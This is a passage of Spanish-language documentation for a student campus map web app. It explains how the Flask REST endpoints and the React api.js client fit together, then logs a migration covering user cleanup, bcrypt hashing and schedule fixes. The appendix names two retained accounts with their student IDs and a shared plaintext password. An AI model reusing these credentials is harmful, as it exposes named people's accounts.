Este capitulo explica que archivos del proyecto crean, definen y consumen la API REST. Una API REST es un "contrato" entre el frontend y el backend: define las URLs, los metodos HTTP y los formatos de datos que ambos lados deben respetar.

## 13.1 DONDE SE CREA LA API (ENDPOINTS)

Todos los endpoints se definen en un solo archivo: backend/app.py

Cada endpoint es una combinacion de URL + metodo HTTP + funcion Python. Flask los registra usando decoradores @app.route():

```python
# Este decorador le dice a Flask:
# "Cuando alguien haga una peticion POST a la URL /auth/login,
#  ejecuta la funcion login()"
@app.route("/auth/login", methods=["POST"])
@limiter.limit("5 per minute")
def login():
    data = request.get_json()                        # Leer el JSON del cuerpo
    user, error = auth_service.login(data)           # Delegar al servicio
    if error:
        return jsonify({"error": error}), 401        # Retornar error HTTP 401
    return jsonify(user), 200                        # Retornar usuario HTTP 200
```

El endpoint es SOLO un intermediario. No contiene logica de negocio. Su trabajo es:
1. Recibir la peticion HTTP.
2. Extraer los datos del cuerpo (JSON, parametros de URL, etc.).
3. Llamar al servicio correspondiente.
4. Empaquetar el resultado en una respuesta HTTP con el codigo de estado correcto.

app.py contiene aproximadamente 25 endpoints organizados por dominio:
- Autenticacion (5 endpoints): login, register, set-password, check-email, complete-profile.
- Mapa y navegacion (3 endpoints): buildings, route, graph-info.
- Estacionamiento (3 endpoints): sections, spaces, update-status.
- Horarios (2 endpoints): schedule completo, schedule de hoy.
- Usuario (2 endpoints): obtener datos, actualizar perfil.
- Lugares guardados (3 endpoints): listar, crear, eliminar.

## 13.2 DONDE SE CONSUME LA API (PETICIONES HTTP)

Las peticiones HTTP se centralizan en un solo archivo: frontend/src/services/api.js

Este archivo contiene funciones que encapsulan cada llamada fetch() al backend. Ningun otro archivo del frontend hace peticiones HTTP directamente; todos usan las funciones de api.js.

```javascript
// Funcion que consume el endpoint POST /auth/login
export async function login(boleta, password) {
    const res = await fetch(`${API_BASE}/auth/login`, {
        method: "POST",                           // Metodo HTTP
        headers: { "Content-Type": "application/json" },  // Formato del cuerpo
        body: JSON.stringify({ boleta, password }),        // Datos en JSON
    });
    return handleResponse(res);                   // Manejar la respuesta
}
```

Centralizar las peticiones en api.js tiene ventajas importantes:
- Si la URL del backend cambia, solo se modifica API_BASE en un lugar.
- Si se necesita agregar autenticacion (JWT), se agrega el header en headers() una sola vez.
- Los errores de red se manejan en handleResponse() de forma uniforme.
- Los componentes React no necesitan saber detalles de HTTP; solo llaman funciones.

## 13.3 DONDE SE USAN LAS FUNCIONES DE LA API

Los componentes React importan funciones de api.js y las llaman cuando el usuario interactua:

Login.jsx usa: login(), register(), setPassword(), checkEmail(), completeProfile()
Dashboard.jsx usa: getSchedule(), getProfile()
ParkingPage.jsx usa: getParkingSections(), getParkingSpaces(), updateSpaceStatus()
MapComponent.jsx usa: getWalkingRoute(), getSavedPlaces(), savePlace(), deletePlace()

Ejemplo del flujo completo:

```
COMPONENTE REACT (Login.jsx, Dashboard.jsx, etc.)
       |
       | llama funcion importada de api.js
       v
api.js  →  fetch("http://localhost:5001/auth/login", POST)
       |
       | peticion HTTP viaja por la red
       v
app.py  →  @app.route('/auth/login', methods=['POST'])
       |
       | ejecuta logica de negocio
       v
SERVICIOS (auth_service.py, schedule_service.py, etc.)
       |
       | consulta o modifica datos
       v
REPOSITORIOS (sqlite_repository.py)
       |
       | ejecuta consulta SQL
       v
BASE DE DATOS (school.db, map.db)
```

El frontend NUNCA accede directamente a la base de datos. Siempre pasa por la API REST, que actua como una barrera de seguridad entre el mundo exterior y los datos internos.


# APENDICE A. MIGRACION Y LIMPIEZA POST-REFACTORIZACION

Fecha: 10 de marzo de 2026

Este apendice documenta los cambios realizados durante la migracion posterior a la refactorizacion del sistema. Estos cambios se hicieron para limpiar datos obsoletos, mejorar la seguridad y corregir errores en los horarios.

## A.1 LIMPIEZA DE USUARIOS ANTIGUOS

Se eliminaron todos los usuarios creados antes de la refactorizacion, excepto dos cuentas de prueba que se conservaron:
- Omar Sosa (boleta: 2025350215)
- Adrian Frias (boleta: 2024351279)

La eliminacion se realizo en el orden correcto para respetar las claves foraneas y evitar registros huerfanos:
1. Primero se eliminaron las reservas de estacionamiento.
2. Despues las ocupaciones de estacionamiento.
3. Luego las inscripciones.
4. Finalmente los registros de alumnos.

Este orden es importante porque si se borrara un alumno antes de borrar sus reservas, la base de datos tendria reservas apuntando a un alumno que ya no existe (registros huerfanos), lo que podria causar errores.

## A.2 IMPLEMENTACION DE BCRYPT

Se migro el sistema de hashing de contrasenas de PBKDF2-SHA256 (via werkzeug) a bcrypt:

Cambios en codigo:
- auth_service.py: Se crearon los metodos _hash_password(), _verify_password() y _needs_rehash().
- requirements.txt: Se agrego la dependencia bcrypt.

Se establecio la contrasena "nueva123" para ambos usuarios conservados, hasheada con bcrypt.

Se implemento migracion transparente para hashes legacy (ver seccion 3.8).

## A.3 LIMPIEZA DE BASES DE DATOS ANTIGUAS

Se eliminaron archivos de bases de datos que ya no estaban referenciados en config.py:
- backend/campus.db (base de datos unica original, reemplazada por map.db + school.db)

Solo se conservaron las bases de datos activas:
- instance/map.db
- instance/school.db

## A.4 CORRECCION DE HORARIOS

Se corrigio el horario de la materia "Estructura de Datos" para el grupo 3CV35:
- Martes: 10:30-12:00 (corregido de un horario incorrecto anterior)
- Viernes: 10:30-12:00 (corregido de un horario incorrecto anterior)


# NOTA FINAL

Este sistema fue desarrollado como proyecto academico para la ESIME Culhuacan del Instituto Politecnico Nacional. Demuestra la aplicacion practica de conceptos de ingenieria de software como arquitectura cliente-servidor, APIs REST, bases de datos relacionales, algoritmos de grafos, seguridad web e interfaces responsivas.

El codigo fuente esta disponible en:
https://github.com/AlexGuittar1/Mapa_interactivo_ESIME_CULHUACAN

Para cualquier duda o contribucion, pueden contactar a los autores a traves del repositorio de GitHub.

FIN DE LA DOCUMENTACION.
